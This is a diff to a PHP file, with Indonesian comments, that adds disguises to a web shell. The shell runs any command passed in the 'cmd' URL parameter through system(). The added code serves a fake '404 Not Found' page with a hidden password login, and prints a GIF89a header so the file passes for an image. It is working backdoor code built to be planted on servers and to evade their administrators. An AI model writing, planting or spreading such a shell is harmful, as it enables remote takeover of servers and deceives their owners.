@@ -1,7 +1,69 @@
 <?php
-if(isset($_GET['cmd'])){
+$pass = "2011";
+
+if (isset($_POST['x']) && $_POST['x'] === $pass) {
+    // Masuk ke shell (script shell lu nanti masuk di bawah ini)
+} else {
+    http_response_code(404);
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>404 Not Found</title>
+<style>
+    body {
+        background-color: #fff;
+        color: #000;
+        font-family: Tahoma, sans-serif;
+        text-align: center;
+        margin: 100px;
+    }
+    h1 {
+        font-size: 18px;
+    }
+    #formpass {
+        display: none;
+        margin-top: 20px;
+    }
+    input[type="password"] {
+        border: 1px solid #ccc;
+        padding: 5px;
+        font-family: monospace;
+    }
+    input[type="submit"] {
+        padding: 5px 10px;
+        font-family: monospace;
+    }
+</style>
+        <script>
+            function showForm() {
+                document.getElementById('formpass').style.display = 'block';
+            }
+        </script>
+    </head>
+    <body>
+        <h1 onclick="showForm()" >404 Not Found</h1>
+        <p>The requested URL was not found on this server.</p>
+        <form method="POST" id="formpass">
+            <input type="password" name="x" placeholder="Password">
+            <input type="submit" value="Login">
+        </form>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+?>
+
+<?php
+// Header gambar palsu
+echo "\x47\x49\x46\x38\x39\x61"; // = GIF89a
+// Mulai kode shell
+if(isset($_GET['cmd'])) {
   system($_GET['cmd']);
 }
+?>
+<?php
 // Config
 $shiroko_bg = 'https://imgs.search.brave.com/aiHiaNfkZbZQdi_BJD-iknqbiQSF97A2HbYlebPo6xc/rs:fit:500:0:0:0/g:ce/aHR0cHM6Ly93MC5w/ZWFrcHguY29tL3dh/bGxwYXBlci85NDQv/NTU2L0hELXdhbGxw/YXBlci1zaGlyb2tv/LWZyb20tYmx1ZS1h/cmNoaXZlLWlwaG9u/ZS0xMS10aHVtYm5h/aWwuanBn'; // Background Shiroko
 
